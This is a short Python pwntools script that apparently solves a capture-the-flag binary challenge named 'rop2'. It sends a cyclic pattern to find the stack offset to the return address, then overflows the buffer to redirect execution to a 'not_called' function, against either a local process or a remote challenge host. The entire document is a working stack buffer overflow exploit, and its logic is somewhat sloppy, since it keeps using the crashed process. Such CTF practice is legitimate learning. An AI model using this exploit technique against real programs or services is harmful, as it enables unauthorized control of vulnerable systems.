from pwn import *
binary_path = './pwn/stack/rop-2/rop2'

# Start a process or connect to a remote service
if args.REMOTE:
    p = remote('challenge.example.com', 1337)
else:
    p = process(binary_path)

# Load the binary and the ELF file
elf = ELF(binary_path)
rop = ROP(elf)

# Step 1: Identify the offset to the return address
pattern = cyclic(1024)
p.sendline(pattern)
p.wait()

# Get the core dump to find the offset
core = Coredump('./core')
offset = cyclic_find(core.eip)
print(f'Offset to return address: {offset}')

# Step 2: Find the address of the 'not_called' function
not_called_addr = elf.symbols['not_called']
print(f'Address of not_called: {hex(not_called_addr)}')

# Step 3: Construct the payload
payload = b'A' * offset
payload += p32(not_called_addr)

# Step 4: Send the payload
p.sendline(payload)

# Interact with the process
p.interactive()
